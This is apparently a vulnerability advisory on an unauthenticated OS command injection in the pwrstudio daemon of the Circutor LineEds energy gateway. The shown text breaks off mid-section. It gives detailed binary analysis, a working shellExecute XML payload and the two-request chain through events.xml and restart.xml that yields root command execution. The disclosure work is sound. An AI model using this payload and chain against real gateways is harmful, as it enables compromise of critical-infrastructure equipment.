# Circutor LineEds 24.11.14 — Unauthenticated shellExecute Command Injection in the pwrstudio Event Engine (Root Command Execution)

## 1. Overview

### Overview of the product

Circutor LineEds (Line Energy Data System) is an industrial energy-data gateway: an ARM
embedded appliance that sits between metering and power-quality instrumentation on one side
and an energy-management or SCADA back office on the other. It collects, buffers and forwards
electrical measurement data, and exposes an HTTP management plane for configuration, event
handling and firmware upgrade. Appliances of this class are deployed inside electrical
distribution and critical-infrastructure networks, which is why the deployment context
matters: the trust boundary around such a device is normally the OT segmentation itself, and
anything that lets an unauthenticated peer on that segment execute commands on the gateway
collapses it.

The component analysed here is the daemon `/usr/bin/pwrstudio`. Its properties, established
from the shipped firmware package rather than from documentation, are:

```
/usr/bin/pwrstudio
  ELF 32-bit LSB executable, ARM, EABI5
  size              9.1 MB
  type              EXEC (non-PIE, fixed load addresses)
  entry point       0x37394
  symbols           stripped (no .symtab; analysis is by cross-reference only)
  linkage           dynamic - libpthread, librt, libstdc++, libm, libgcc_s, libc
  ABI               cortexa7hf-neon (ARMv7-A hard-float, NEON)
  byte entropy      6.122 bits/byte - not packed, not encrypted
```

Because the image is a non-PIE `EXEC`, every address quoted in this advisory is a fixed
file-and-memory address. That is what makes the offsets below reproducible against the same
build with no relocation arithmetic, and it is also what made direct debugger invocation of a
single function possible during verification (section 9).

### Overview of the firmware provenance

No claim in this advisory rests on a device we operated. Everything rests on a firmware image
and on the binaries and configuration packages extracted from it. The provenance chain is:

```
LineEds-24.11.14-r0-PS-BUILDID.upgrade        POSIX tar archive
  |- dropbear .ipk                            SSH server package
  |- engine.xml .ipk                          engine configuration package
  |- firmware .ipk                            firmware payload package
  |- forwardproxy-service .ipk                forward proxy service package
  |- nginx .ipk                               nginx reverse proxy package
  |- pwrstudio_24.11.14-r0-pss0_cortexa7hf-neon.ipk      target package
  |- signature .ipk                           image signature package
  `- wifi-watcher .ipk                        wireless supervision package

pwrstudio_24.11.14-r0-pss0_cortexa7hf-neon.ipk
  |- control archive + data archive
  `- data.tar.gz --extract--> ./usr/bin/pwrstudio   (9.1 MB ARM ELF)
```

The `BUILDID` placeholder stands in for a vendor build serial embedded in the image filename.
It is elided because that serial encodes a date, and no date is reproduced anywhere in this
advisory. The firmware version `24.11.14`, the release suffix `r0` and the engine variant
marker `pss0` are version identifiers, not dates, and are reproduced exactly. The presence of
an `nginx` package in the same archive is the artifact evidence for the reverse-proxy front
end discussed in section 4; the research record additionally describes a `lighttpd` front end
on some builds, and no `lighttpd` package appears in the recorded archive listing, so we treat
`nginx` as evidenced and `lighttpd` as unconfirmed.

### Overview of the finding

`pwrstudio` embeds an event engine. Event configuration lives in an XML document exposed at
`/services/user/events.xml` on the daemon's own HTTP interface. An event may carry an
`activate` action of type `shellExecute`, whose `<command>` and `<parameter>` elements are
concatenated by the action's `Execute` method and handed to the C library `system()` call.
There is no sanitisation of either element at any point between the XML parser and the sink:
no quoting, no metacharacter filtering, no allowlist. The concatenation uses the wide-string
format `"%ls %ls"`, so the resulting narrow string is re-parsed by `/bin/sh -c`; a
`<parameter>` that begins with `;` therefore injects an additional shell statement after a
harmless first one.

That sink is by design a powerful feature: an operator who can legitimately edit events can
already run commands. The vulnerability is that an unauthenticated network peer can edit
events, and can then force the engine to reload them. The two HTTP operations needed are:

1. a write to `/services/user/events.xml`, whose handler invokes neither of the two
   authorization routines used elsewhere in the product; and
2. a request to the `restart.xml` route, whose handler invokes only a request-validity
   predicate — a function that tests whether the request and response object pointers are
   non-null — a condition the dispatcher has already satisfied before calling the handler.

Neither handler calls the product's permission gate. That is the load-bearing fact behind the
`PR:N` metric in section 12, and it is established from the binary's own route table and from
a census of the permission gate's callers, not from any assumption about how the device was
configured.

### Overview of what the research record does and does not support

Two elements of the finding deserve their status stated up front, because both are easy to
overclaim.

- **The security toggle default.** The research record asserts that the daemon's security
  enforcement is disabled by default and that this makes even the permission-gated routes
  fail open. We searched the record for a shipped artifact supporting the *default value* — a
  configuration file inside the image, a default value in the extracted root filesystem, or
  vendor documentation of the factory setting — and found none. The assertion appears only in
  prose, and the dynamic verification never exercised HTTP, so no unauthenticated request
  against a toggle-disabled device was ever observed. Section 3 therefore treats the toggle as
  *not load-bearing*: the classification rests on handler-level evidence that the two routes
  in this chain never reach the toggle at all. Where the toggle does matter — the
  `reloadCfg.xml` variant of the trigger — we say so, and keep it out of the primary score.
- **The privilege level on the device.** The `uid=0(root)` in section 9 was produced by the
  emulation harness, which ran as root on the analysis host. It demonstrates that the sink
  executes with the privileges of the process that calls it; it is not a measurement of the
  account a shipped device assigns to `pwrstudio`. The record states that `pwrstudio` is the
  device's root daemon, which is consistent with the routes it owns (device restart,
  configuration reload, firmware upgrade), but no init script, service unit or startup entry
  from the image was recorded as evidence. The labelling of "root on the device" as inference
  is done here and in section 5, which states the device-side attribution as inference from
  the daemon's role rather than as an artifact measurement; section 10 carries the privilege
  level forward as "recorded as root and argued in section 5" and does not present it as
  measured. Neither caveat changes the CVSS impact metrics: arbitrary command execution on
  the gateway is High for confidentiality, integrity and availability under any daemon
  account.

### Overview of the sibling product, and why it is not this finding

Circutor also sells a Windows platform named PowerStudio SCADA WAVE, whose engine is
`PwrStudio.exe`. It shares the *design* of the event engine — the same `shellExecute` action
name, the same condition / actions / activate schema, and the same `"%ls %ls"` concatenation
format — because both descend from one engine lineage. They are nevertheless different
products, on different platforms, with different sink APIs. This advisory is about the Linux
binary only; section 12 carries the full comparison. Nothing in this advisory is a claim that
the Windows platform is affected by this defect, and nothing here re-assesses that platform.

## 2. Vulnerability Summary

### Vulnerability summary

An unauthenticated remote attacker who can reach the `pwrstudio` HTTP management interface of
a Circutor LineEds gateway can obtain arbitrary operating-system command execution on the
appliance by writing one event definition into the engine's event configuration file and then
asking the engine to restart. The write targets `/services/user/events.xml`; the restart
targets the `restart.xml` route. The restart makes the engine re-read the event configuration
through `XCEventDriver::LoadXml`, which constructs an `XCEventActionShellExecute` object from
the `shellExecute` element and, once the event's `<condition>` evaluates true, dispatches its
`Execute` method. `Execute` builds a single string from the command and parameter elements and
passes it to `system()`, which hands it to `/bin/sh -c`. Shell metacharacters in the parameter
are interpreted, and the command runs with the daemon's privileges.

### Vulnerability summary of the payload

The event element the engine accepts, and that the proof of concept submits, is:

```xml
<event>
  <condition>1==1</condition>
  <actions>
    <activate>
      <shellExecute>
        <command>x</command>
        <parameter>;id >/tmp/circutor_eds_vuln_rce_marker;#</parameter>
      </shellExecute>
    </activate>
  </actions>
</event>
```

Each part has a job:

- `<condition>1==1</condition>` is an identity expression that the engine's condition
  evaluator resolves as true, so the event enters the live set on every evaluation pass rather
  than waiting for a measurement threshold. The evaluator function is identified in
  section 6.
- `<command>x</command>` is a deliberately invalid program name. It exists so that the first
  shell statement fails harmlessly; the injected statement follows it. This matters for
  stealth and for reliability, because nothing in the sink requires the first token to be a
  real binary.
- `<parameter>` carries the payload. A leading `;` closes the first statement, the injected
  command runs, and a trailing `;#` opens a comment that absorbs any residual tail of the
  concatenated string.

### Vulnerability summary of the resulting command line

After the wide-to-narrow conversion, the string handed to `system()` is:

```sh
/bin/sh -c "x ;id >/tmp/circutor_eds_vuln_rce_marker;#"
```

The shell parses this as three items. The first, `x`, is attempted and fails with a
command-not-found status. The second, `id >/tmp/circutor_eds_vuln_rce_marker`, executes and
writes the marker file. The third is a comment. Because the exit status of a sequential list
is the status of its last executed command, the overall status reflects the injected command,
not the failing first one — a point that matters when reading the verification output in
section 9, where the harness message anticipates a 127 status and the recorded run returned 0.
Both are consistent with successful injection; 0 is in fact the correct expectation for this
payload shape, and the recorded 0 is the stronger signal.

### Vulnerability summary of the classification

- **Class**: OS command injection (CWE-78) reached without authentication (CWE-306).
- **Access vector**: network, against the daemon's own HTTP interface.
- **Privileges required**: none, on the evidence of the handler-level gate census.
- **User interaction**: none; both steps are ordinary HTTP requests.
- **Scope**: unchanged — the executed command runs inside the same device authority that the
  daemon already holds, and no separate security realm is entered.
- **Primary score**: 9.8 Critical, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`. A
  credential-required conditional reading of 8.8 High is published alongside it in
  section 12.
- **Verification status**: the sink is dynamically proven on the shipped binary under
  emulation; the HTTP delivery path is statically proven end to end and was not exercised
  against a device or an emulated network stack. Section 9 states this boundary precisely.

## 3. Authentication Boundary

### Authentication boundary model of the product

`pwrstudio` implements authorization as a per-handler gate, not as a middleware stage in the
dispatcher. The gate is a single function, `FUN_001a93cc`, invoked with a permission constant
by whichever handler chooses to invoke it. Its call chain as recorded is:

```
FUN_001a93cc(ctx, perm, ...)          permission gate; called by individual handlers
   -> FUN_002a7344(...)               gate dispatcher
        -> FUN_0015ef70(...)          leaf routine (not labelled in the record)
        -> FUN_00236a38(...)          security-toggle evaluation leaf
```

The two leaves are reachable from the dispatcher; the research record attributes the
security-toggle evaluation specifically to `FUN_00236a38` and does not label `FUN_0015ef70`,
so we describe the latter only as the second leaf and infer nothing further about it.

The gate's decision logic, as established by static analysis:

```c
int FUN_001a93cc(ctx_t *ctx, int perm, ...)
{
        if (perm != 0x15)                     /* 0x15 == 21 */
                return SUCCESS;               /* return with NO check of any kind */

        security_enabled = (*(ctx + 0x10) != *(ctx + 0x0c));
        if (!security_enabled)
                return SUCCESS;               /* toggle off  -> fail open */

        return normal_authentication(ctx);    /* toggle on   -> credential check */
}
```

Three properties of this function are visible without any configuration assumption:

- **Handlers that pass a permission other than `0x15` are never authorized at all.** The
  function returns success on the first branch regardless of who is asking. This is a genuine
  authentication-bypass defect in the gate itself, independent of the security toggle and
  independent of this advisory's chain. We record it here because it materially widens the
  product's exposure, but the chain analysed in this advisory does not depend on it.
- **Handlers that pass `0x15` are authorized only while the toggle is on.** With the toggle
  off, the same success value is returned. Whether the toggle is off on a shipped device is
  the question addressed in the evidence-status subsection below.
- **Handlers that never call the gate are always reachable.** This is the case that applies to
  this chain, and it is the one that carries the unauthenticated classification.

The `security_enabled` test deserves a note, labelled as interpretation rather than as a
recorded fact: comparing two adjacent context fields and treating *inequality* as "enabled" is
the shape of an empty-range test over a container (begin != end means at least one element).
Read that way, security is "enabled" only when the device actually holds at least one
configured credential or authorization rule, and a device with an empty credential container
is unauthorized-by-construction. We did not verify this reading against the container's
element type, and we do not rely on it; it is offered because it would explain why a
freshly-provisioned appliance can plausibly ship with enforcement inert.

### Authentication boundary of the permission-gate caller census

The decisive question for this chain is not what the gate does, but who calls it. A
cross-reference census of `FUN_001a93cc` in the shipped binary records **197 call sites, all
of them individual action handlers, all inside the address range `0x1aexxx`–`0x1bfxxx`**. The
recorded examples span from `fcn.001ae9d8` and `fcn.001aee54` at the low end to `fcn.001bf0b0`
at the high end:

```
axt FUN_001a93cc                     -> 197 call sites
   range                              0x1ae000 .. 0x1bf000 (per-handler action handlers)
   examples                           fcn.001ae9d8, fcn.001aee54, ... fcn.001bf0b0

   restart.xml   handler  FUN_001e3554 @ 0x1e3554   -> NOT in the caller set
   events.xml    handler  FUN_0023ace0 @ 0x23ace0   -> NOT in the caller set
```

Both handlers in this chain sit outside that range and outside that caller set. The
permission gate is therefore structurally incapable of authorizing either of them: it is never
invoked on their paths. This is a property of the binary, not of a configuration, and it is
the reason the chain does not depend on the security-toggle question.

### Authentication boundary adjudication of the request-context dispute

Two analysis passes over this chain disagreed on one point, and the disagreement is worth
reproducing because it is the crux of the reachability claim. The restart handler begins with
a check performed by `FUN_001a955c`, which inspects request-context fields at offsets `+0x34`
and `+0x4c`:

- The **refuting reading** was that `+0x34` and `+0x4c` are *session* fields — populated only
  after a successful login — so an unauthenticated request would present both as zero and
  `FUN_001a955c` would block the handler.
- The **affirming reading** was that those fields are the *request object* and *response
  object* pointers, installed unconditionally by the dispatcher's setup routine before the
  handler is entered, so the check is a validity test and always passes.

The adjudication rests on four pieces of binary evidence.

**Evidence 1 — `FUN_001add40` is the HTTP request setup routine, not a session setter.**
Its decompilation:

```c
int FUN_001add40(int arg1, int arg2, int arg3)
{
        *(arg1 + 0x4c) = arg3;                  /* +0x4c = response object */
        *(arg1 + 0x34) = arg2;                  /* +0x34 = request object (carries body size) */
        fcn.001a93a4(arg1);                     /* release the previous body buffer at +0x5c */
        iVar3 = fcn.0070ec24(*(arg1 + 0x34));   /* 0070ec24(request) -> body size */
        if (0x6400000 < size)                   /* 100 MiB cap */
                return 0x19d;                   /* 0x19d == 413 Payload Too Large */
        *(arg1 + 0x5c) = operator_new(size + 1);/* +0x5c = freshly allocated body buffer */
        while (true) { /* ... read and copy the request body ... */ }
}
```

Every field this function writes is HTTP plumbing: a request object, a response object, a
body buffer, and a 100 MiB body-size cap that returns HTTP 413. Nothing about credentials,
tokens or sessions is read or written. The fields are assigned from the setup routine's own
arguments, so they are non-zero for every well-formed request, authenticated or not.

**Evidence 2 — the route table installs setup before handler for the restart route.** The
32-byte route entry at `0x76a480` was dumped and confirmed field by field:

```
0x76a480:  0x76a4b8   0x1e2e3c   0x1e2e5c   0x1add40    <- +0x0c = setup   FUN_001add40
0x76a490:  0x1e3554   0x1ab69c   "29XCProc..."           <- +0x10 = handler FUN_001e3554
```

The dispatcher calls the routine at `+0x0c` first and the routine at `+0x10` second. For the
restart route that ordering means `+0x34` and `+0x4c` are populated by `FUN_001add40` before
`FUN_001e3554` executes its first instruction. The string literal `29XCProc...` at the tail of
the entry is another C++ typeinfo-style length-prefixed name, consistent with the engine
class-naming scheme catalogued in section 4.

**Evidence 3 — `FUN_001a955c` is a validity predicate.** Its entire body:

```c
bool FUN_001a955c(int param_1)
{
        if (*(int *)(param_1 + 0x34) != 0)
                return *(int *)(param_1 + 0x4c) != 0;
        return false;
}
```

Translated: "a request object exists AND a response object exists". There is no credential,
token, session identifier, timestamp, role or permission constant anywhere in the function. It
cannot distinguish an authenticated caller from an unauthenticated one because it never looks
at anything that differs between them.

**Evidence 4 — the restart handler contains no permission gate.** Its decompilation:

```c
void FUN_001e3554(int arg1)
{
        iVar1 = fcn.001a955c(arg1);      /* validity: are +0x34 / +0x4c non-zero? */
        if (iVar1 != 0) {                /* per-request true, unauthenticated included */
                /* ... match the requested action name at 0x1e36f8 ... */
                fcn.001e3000(arg1);      /* -> event load chain -> system() */
        }
        return;                          /* skipped only if +0x34 or +0x4c were zero */
}
```

The only guard on the path from HTTP request to the event-load chain is the validity
predicate. No call to `FUN_001a93cc` appears in the handler, which the caller census already
predicted from the address range.

Taken together, the refuting reading is disproved: `+0x34` and `+0x4c` are request and
response object pointers installed by the dispatcher's setup routine, they are non-zero for
every valid HTTP request, and the predicate that tests them is not an authentication check.
The unauthenticated restart trigger stands.

### Authentication boundary of the events.xml write handler

The write side was examined separately, because it is a different handler with a different
dispatcher. The recorded handler for `/services/user/events.xml` is `FUN_0023ace0`, reached
through dispatcher `fcn.002403f0`. Decompilation of both shows:

```
fcn.002403f0   (route dispatcher for the events service)
  - vector iteration over registered actions
  - action-name string match via func_0x001533c8
  - HTTP method check (accepts the recorded constants 2 and 0x1000)
  - NO call to FUN_001a93cc     (permission gate)
  - NO call to FUN_001a955c     (validity predicate)

FUN_0023ace0   (events.xml handler)
  - receives the request body into a 0x400-byte buffer
  - parses XML
  - produces 401 and 200 outcomes
  - NO call to FUN_001a93cc
  - NO call to FUN_001a955c
```

We record one tension in this evidence rather than smooth it over. The handler is described
in the research record as producing both 401 and 200 outcomes, which means it is *capable* of
rejecting a request; yet the same record's decompilation pass finds no call to either
authorization routine in it or in its dispatcher. The record does not identify what condition
selects the 401 branch. The honest reading is therefore: the write path contains no
authorization call that we could find, and it also contains a rejection path whose trigger
condition is unknown. Section 12 keeps the unauthenticated score as primary on the strength of
the gate census and the dispatcher decompilation, and carries a credential-required
conditional score precisely to account for the possibility that some deployment or some
unresolved branch rejects anonymous writes.

We also note that the recorded method check accepts the numeric constants `2` and `0x1000`,
and that the record does not map those constants to HTTP method names. The proof of concept
issues `PUT` for the write because the recorded chain description specifies a write of the
events document, not because a constant was resolved to `PUT`. An operator testing this
against their own equipment should be prepared to try `POST` if `PUT` is refused.

### Authentication boundary evidence status of the security-toggle default

This subsection exists because the record's headline framing is "security is disabled by
default, therefore every route is unauthenticated", and that framing is not supported by a
shipped artifact.

What the record contains, exhaustively, on the toggle default:

```
Assertion                              Artifact cited in the record
------------------------------------   -----------------------------------------
"security is disabled by default"      none
"all routes unauthenticated            none (derived from the assertion above)
 when security is disabled"
perm != 0x15 returns SUCCESS           yes - decompilation of FUN_001a93cc
perm == 0x15 checks the toggle         yes - decompilation of FUN_001a93cc
restart handler calls no gate          yes - route entry 0x76a480, FUN_001e3554
                                       decompilation, 197-caller census
events.xml handler calls no gate       yes - FUN_0023ace0 and fcn.002403f0
                                       decompilation
```

Three of the five rows are binary evidence. The first two rows — the ones that use the word
"default" — have no artifact behind them. Specifically, none of the following was located or
recorded: a configuration file inside the `.upgrade` archive carrying an explicit security
value; a default value read out of the extracted root filesystem's configuration directory;
the `engine.xml` package's contents, which is the most likely place such a value would live
and which the archive listing shows is present but whose contents the record does not quote;
or any vendor manual page stating the factory setting.

Consequences, stated plainly:

- The claim "security is disabled by default" is **not published as a fact** in this advisory.
  We publish it as an unverified assertion carried by the research record.
- The unauthenticated classification of this chain does **not** depend on it. Both routes in
  the chain bypass the gate structurally, as shown by the census and the two handler
  decompilations, so the toggle's value never reaches the decision.
- The one place the toggle genuinely matters is the alternative trigger `reloadCfg.xml`, whose
  reload action `FUN_001f18c0` does call `FUN_001a93cc(param_1, 0x15, ...)`. For that
  variant, reachability without credentials requires the toggle to be off, which requires the
  unverified default. We therefore treat `reloadCfg.xml` as a *conditional* secondary trigger
  throughout, and the proof of concept uses `restart.xml` first and `reloadCfg.xml` only as a
  fallback.
- A defender who cannot settle the toggle question from this advisory can settle it from
  their own device: inspect the running configuration of the events/user service and confirm
  whether an authenticated session is required to read or write
  `/services/user/events.xml`. That single test resolves the deployment-specific posture, and
  it is a more reliable answer than anything we can derive from a binary.

## 4. Attack Surface

### Attack surface inventory of the HTTP interface

The daemon's own HTTP listener binds port `1500`, behind the reverse-proxy front end evidenced
by the `nginx` package in the firmware archive. Approximately 28 routes were recovered from
the binary's route strings. The recorded set, grouped:

```
authentication        /api/v1/login
                      ",\"authentication\":\"JWT\",\"user\":\"   (response shape string)
                      "Bearer "                                  (token prefix)

user event service    /services/user/events.xml        @0x774281 (route string)
                                                path   @0x774290 (filesystem path)
                      /services/user/eventsInfo.xml

event service         /services/events/acknowledge.xml
                      /services/events/listener.xml
                      /services/events/producer.xml

system control        restart.xml                      @0x76a4f3 (route string)
                                                     -> route entry @0x76a480
                      reloadCfg.xml
                      /upgrade.cgi
                      /services/system/*
```

Route discovery used the string table, since the binary is stripped. The addresses shown are
file offsets of the route and path literals in the non-PIE image. The presence of an
`/api/v1/login` route and JWT-shaped response strings confirms the product has a real
authentication mechanism available; the question addressed in section 3 is which routes
actually invoke it.

### Attack surface of the identity strings

The stripped binary nevertheless leaks its class inventory through C++ typeinfo-style,
length-prefixed name records. Each leading decimal in the strings below is exactly the byte
length of the class name that follows it, which is what makes the mapping reliable without
symbols:

```
25XCEventActionShellExecute     len("XCEventActionShellExecute") = 25   the sink class
13XCEventDriver                 len("XCEventDriver")            = 13   event loader
13XCEventServer                 len("XCEventServer")            = 13
13XCEventSystem                 len("XCEventSystem")            = 13
18XCEventServerGroup            len("XCEventServerGroup")       = 18
```

All five prefix/length pairs match. Two further strings shape the analysis:

```
CONFIG_NO_HASP        compiled without the HASP hardware licence dongle gate
%ls %ls               @0x7cc2d0 - the wide-format concatenation used by the sink
```

`CONFIG_NO_HASP` is worth calling out for a defender's threat model. The vendor's Windows
engine gates part of its behaviour behind a licence dongle; this Linux build is compiled with
that gate absent, so there is no licence-level obstacle between an attacker's written event
and the shell action. Nothing about the licence mechanism would have been a security control
in any case, but its absence removes any assumption that a feature is unavailable on an
unlicensed appliance.

### Attack surface of the XML configuration store

The event configuration document is a persistent store, not a transient request parameter. Its
filesystem path literal lives at `0x774290` and is referenced by two functions —
`FUN_001b1990` and `FUN_001d9e00` — corresponding to a reader and a writer. That structure has
two consequences for the attack surface:

- A successful write **persists**. The injected event survives until the document is rewritten,
  so a single unauthenticated write can arm a payload that fires on every subsequent engine
  start, including starts caused by unrelated operator activity, a watchdog or a power cycle.
- The configuration store is also the **resumption point** after a restart. There is no need
  for the attacker to keep a session, to poll, or to win a race: the file is the state.

### Attack surface of the firmware package

The `.upgrade` archive contents indicate the appliance's own service inventory: an SSH server
(`dropbear`), an `nginx` reverse proxy, a forward-proxy service, a wireless supervision
watchdog, a firmware package and a signature package, alongside `pwrstudio`. We did not
analyse any package other than `pwrstudio`, and we make no claim about them. They are listed
because they define what else is listening on the appliance, and because the `/upgrade.cgi`
route in section 4's inventory belongs to a device that accepts firmware images over the same
management plane this chain abuses — which raises the stakes of unauthenticated access to that
plane considerably, independent of this finding.

## 5. Sink Identification

### Sink identification of the execute method

The sink is `FUN_00548414` at `0x548414`, identified as `XCEventActionShellExecute::Execute`
from the typeinfo-length-prefixed class name `25XCEventActionShellExecute` catalogued in
section 4 and from the function's use of the wide-format concatenation and `system()`. The
decompilation:

```c
undefined4 FUN_00548414(int param_1)
{
        piVar1 = (int *)FUN_00545d24();             /* returns *(param_1 + 0x10): sub-object */
        (**(code **)(*piVar1 + 8))(piVar1,
                                   param_1 + 0x2c,    /* destination: processed parameter */
                                   param_1 + 0x20);   /* source: raw parameter string */

        swprintf(awStack_1010, 0x400, DAT_005484f4,   /* format = L"%ls %ls" @0x7cc2d0 */
                 *(param_1 + 0x14),                   /* <command>   */
                 *(param_1 + 0x2c));                  /* <parameter> */

        FUN_0006eefc(...);                            /* wide -> narrow conversion */
        system(local_1028);                           /* SINK, call site 0x5484bc */
        return 1;
}
```

Object layout as used by this function, all offsets confirmed by the verification harness in
section 9, which had to construct this object by hand:

```
param_1 + 0x10     pointer to a sub-object whose vtable slot [2] performs the
                   parameter copy (+0x20 -> +0x2c)
param_1 + 0x14     <command>  wide string pointer
param_1 + 0x20     <parameter> wide string pointer, as loaded from XML
param_1 + 0x2c     <parameter> wide string pointer, after the virtual copy
```

The `system()` call site is at `0x5484bc`, i.e. `0xa8` (168) bytes into the function that
begins at `0x548414`. The function returns the constant `1` as its success indicator, and the
recorded verification run observed exactly that return value.

### Sink identification of the format string

`DAT_005484f4` is not a string but a literal-pool word inside the function's own body — the
function spans `0x548414` to just before `0x5484fc`, and `0x5484f4` falls within that range,
which is why the decompiler renders it as an unnamed data reference. That word holds the
address `0x7cc2d0`, where the format string itself lives in UTF-32LE:

```
0x7cc2d0:  25 00 00 00   '%'
           6c 00 00 00   'l'
           73 00 00 00   's'
           20 00 00 00   ' '
           25 00 00 00   '%'
           6c 00 00 00   'l'
           73 00 00 00   's'
           00 00 00 00   terminator            -> L"%ls %ls"
```

This is the whole reason the injection works the way it does. Two `%ls` conversions separated
by a single space mean the sink performs *concatenation*, not *argument separation*: command
and parameter become one shell word sequence with no quoting boundary between them. Had the
format been, for example, a quoted `"%ls" "%ls"`, the payload would have needed to escape a
quote first. As shipped, the payload needs only a statement separator.

We note for completeness that the vendor's Windows engine uses the same `"%ls %ls"` format for
the same action. That is evidence of a shared engine design, not of shared code bytes — one is
a Linux C++ ARM build calling libc `system()` and the other is a native C++ PE32+ (64-bit)
Windows build calling Win32 process APIs — and section 12 treats the two as separate
findings.

### Sink identification of the XML loader

`FUN_005484fc` at `0x5484fc`, immediately after `Execute` in the same translation-unit
neighbourhood, is `XCEventActionShellExecute::LoadXml`. It reads the two XML elements into the
object fields that `Execute` later consumes:

```c
/* FUN_005484fc - LoadXml */
XML element "command"     (tag string literal @0x761cb4, UTF-32LE)
        via pointer word DAT_005485bc  -> written to param_1 + 0x14
XML element "parameter"   (tag string literal @0x759464, UTF-32LE)
        via pointer word DAT_005485c4  -> written to param_1 + 0x20
```

`DAT_005485bc` and `DAT_005485c4` follow the same literal-pool pattern as the format-string
pointer: they are pointer words inside the loader's own body holding the addresses of the
UTF-32LE tag names. No validation, escaping or character filtering occurs in this function —
it is a pure element-to-field copy, which is the correct behaviour for a parser and the reason
the defence has to sit elsewhere (section 11).

### Sink identification of the driver that owns the loader

`FUN_0020acac` at `0x20acac` is `XCEventDriver::LoadXml`. Its recorded cross-references
include the tag strings for `actions`, `activate` and `shellExecute`, and it dispatches into
`FUN_005484fc` and onward to `FUN_00548414` through vtable dispatch, that is, through the
sub-object pointer that `Execute` fetches at `+0x10`. Its call sites are recorded as
`0x21b38c` and `0x21b54c`, both inside the event-loader function `FUN_0021add8` described in
section 7. Dispatch through a vtable is why the verification harness in section 9 had to plant
a return-immediately gadget at the sub-object's vtable slot: it lets `Execute` proceed to the
concatenation and the sink without invoking the real copy routine, which requires a fully
constructed engine.

### Sink invocation context and process account

The sink executes in the context of the `pwrstudio` process. The research record states that
this is the device's root daemon, and that the daemon's own HTTP listener on port `1500`
sits behind the `nginx` front end evidenced in the firmware archive. As set out in section 1,
we did not locate a shipped init script, service unit or startup entry naming the execution
account, so the root attribution on a live device is an inference from the daemon's role — it
owns device restart, configuration reload and firmware upgrade — rather than an artifact
measurement. What *is* measured is that the sink runs with the privileges of its caller: in
the verification run the caller was the emulation harness, which held `uid=0`, and the marker
file it produced is owned `root:root`.

For severity purposes the distinction is immaterial: an attacker-controlled `system()` call in
the process that owns the gateway's configuration, restart and upgrade paths is a complete
compromise of the appliance whether the account is `root` or a dedicated service user with
write access to the same files.

## 6. Source Identification

### Source identification of the attacker-controlled input

The attacker-controlled data originates in the HTTP request body of a write to
`/services/user/events.xml`. Three artifacts locate it in the binary:

```
route string   "/services/user/events.xml"   @0x774281   (ASCII)
file path      events.xml document path      @0x774290   (referenced by FUN_001b1990 reader
                                                          and FUN_001d9e00 writer)
handler        FUN_0023ace0                              (0x400-byte receive buffer,
                                                          XML parse, 401/200 outcomes)
dispatcher     fcn.002403f0                              (vector iteration + action-name
                                                          match via func_0x001533c8 +
                                                          HTTP method check)
```

From the handler's receive buffer the body is parsed as XML. The two elements that reach the
sink are `<command>` and `<parameter>`, extracted by `FUN_005484fc` into object fields `+0x14`
and `+0x20` as shown in section 5. Between the socket and those fields there is no decoding
step that would neutralise shell metacharacters: the values travel as text, are converted to
wide strings, and are concatenated.

### Source identification of the second input, the trigger

The chain has two independent inputs and both are attacker-controlled over the network. The
second is the trigger. The `restart.xml` route string is at `0x76a4f3` and its route table
entry at `0x76a480` (section 3) names `FUN_001add40` as setup and `FUN_001e3554` as handler.
The trigger carries no data into the sink — it supplies only control. That separation is what
makes the attack a two-step chain rather than a single request, and it also means the two
steps can be separated in time arbitrarily: the configuration write can be armed long before
anything causes a restart.

`reloadCfg.xml` is the second, equivalent trigger route, reaching the same event-load chain
through `FUN_001f3ce0`, then `FUN_001f18c0`, then `FUN_001ab974`. It differs in one respect
that matters: `FUN_001f18c0` calls `FUN_001a93cc(param_1, 0x15, ...)`, so this variant does
pass through the permission gate with permission `0x15` and is therefore subject to the
security-toggle question that section 3 could not settle from an artifact. `restart.xml`
remains the primary trigger for this reason, and the proof of concept tries it first.

### Source identification of the condition expression

The third input is not attacker data in the same sense but it is attacker-supplied and it
decides whether the action fires at all. It is the `<condition>` element of the event. The
recorded evaluator is `FUN_004ce47c` at `0x4ce47c`, identified by its two references to the
`condition` tag string at `0x7563e4`. An identity expression such as `1==1` resolves to true,
so the event activates on every evaluation pass instead of waiting for a measurement to cross
a threshold.

We flag the depth boundary here explicitly. The research record identifies the evaluator
function and records the identity expression's expected truth value by analogy with the
vendor's Windows engine, whose condition evaluator is analysed in more detail in our separate
published work on that platform. The Linux evaluator's operator table was **not**
independently disassembled in this research, and the evaluator was **not** executed during
verification — the harness in section 9 calls `Execute` directly, skipping condition
evaluation entirely. The condition link is therefore the one hop in the chain that rests on
identification plus analogy rather than on decompilation to sink depth or on execution. An
operator validating this on their own equipment should treat "does `1==1` activate the
action?" as the first thing to confirm empirically.

## 7. Data Flow

### Data flow from socket to shell

The complete path, established by cross-reference in the shipped binary. Every arrow below is
a recorded caller/callee relationship, not an inference:

```
[attacker, unauthenticated]
   |
   |  step 1: HTTP write of the events document
   v
/services/user/events.xml (route string @0x774281)
   -> fcn.002403f0        route dispatcher: vector iteration, action-name match
                          (func_0x001533c8), HTTP method check. No gate call.
   -> FUN_0023ace0        events.xml handler: 0x400-byte receive buffer, XML parse,
                          401/200 outcomes. No gate call.
   -> FUN_001d9e00        writer, referencing the events.xml path literal @0x774290
   == events document now contains the shellExecute event (PERSISTED) ==

[attacker, unauthenticated]
   |
   |  step 2: HTTP request to the restart route
   v
restart.xml (route string @0x76a4f3, route entry @0x76a480)
   -> FUN_001add40        setup: +0x34 = request object, +0x4c = response object,
                          +0x5c = body buffer, 100 MiB cap -> 413 (0x19d)
   -> FUN_001e3554        restart handler: FUN_001a955c validity test only
   -> FUN_001e3000
   -> FUN_00217c4c        event-system trigger (also called from FUN_002cece4)
   -> FUN_00214ba0        event loader trigger
   -> FUN_0021add8        event loader - its own caller is FUN_00214ba0
   -> FUN_0020acac        XCEventDriver::LoadXml - reads actions / activate / shellExecute
                          call sites 0x21b38c, 0x21b54c, both inside FUN_0021add8
   -> FUN_005484fc        XCEventActionShellExecute::LoadXml
                          XML "command"   (@0x761cb4) -> obj+0x14
                          XML "parameter" (@0x759464) -> obj+0x20
   -> FUN_00548414        XCEventActionShellExecute::Execute
                          virtual copy obj+0x20 -> obj+0x2c
                          swprintf(buf, 0x400, L"%ls %ls" @0x7cc2d0, obj+0x14, obj+0x2c)
                          FUN_0006eefc  wide -> narrow
                          system(narrow)  call site 0x5484bc
   -> /bin/sh -c "x ;<attacker command>;#"
```

The condition evaluator `FUN_004ce47c` sits on the branch between `LoadXml` and `Execute`: an
